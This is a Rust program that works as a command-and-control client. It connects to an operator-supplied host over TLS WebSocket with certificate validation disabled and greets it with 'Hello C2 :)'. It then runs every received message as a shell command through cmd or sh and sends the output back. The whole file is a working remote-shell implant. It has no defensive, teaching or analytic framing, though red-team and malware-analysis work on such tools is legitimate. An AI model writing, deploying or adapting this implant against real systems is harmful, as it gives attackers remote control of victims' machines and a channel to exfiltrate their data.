use tungstenite::{Message, client};
use tungstenite::protocol::CloseFrame;
use tungstenite::protocol::frame::coding::CloseCode;
use url::Url;
use std::process::Command;
use std::env;

use native_tls::TlsConnector;
use std::net::TcpStream;

fn main() {
    let args: Vec<String> = env::args().collect();
    let host = &args[1];
    let port = &args[2];
    let url = format!("wss://{}:{}", host, port);

    let tlsconnector = TlsConnector::builder().danger_accept_invalid_certs(true).build().unwrap();
    let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
    let stream = tlsconnector.connect(url.as_str(), stream).unwrap();
    let (mut socket, _response) = client(Url::parse(url.as_str()).unwrap(), stream).unwrap();
 
    socket.write_message(Message::Text("Hello C2 :)".into())).unwrap();
    
    // Loop forever, handling parsing each message
    loop {
        let msg = socket.read_message().expect("Error reading message");
        let msg = format!("{}", msg);

        let close_msg = vec!["quit","exit","bye"];
        if close_msg.contains(&msg.as_str()) {
            let close_frame = CloseFrame {
                code: CloseCode::Away,
                reason: Default::default(),
            };
            socket.write_message(Message::Text("endingwebsocket".into())).unwrap();
            socket.close(Some(close_frame)).expect("Error closing socket");
            break;
        }

        let cmd = &msg;
        // println!("{}",cmd);
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                    .args(["/C", cmd])
                    .output()
                    .expect("failed to execute process")
        } else {
            Command::new("sh")
                    .arg("-c")
                    .arg(cmd)
                    .output()
                    .expect("failed to execute process")
        };
        let mut payload = String::from_utf8(output.stdout).unwrap();
        if &payload == ""{
            payload = " ".into();
        }
        socket.write_message(Message::Text(payload.into())).unwrap();
    }
}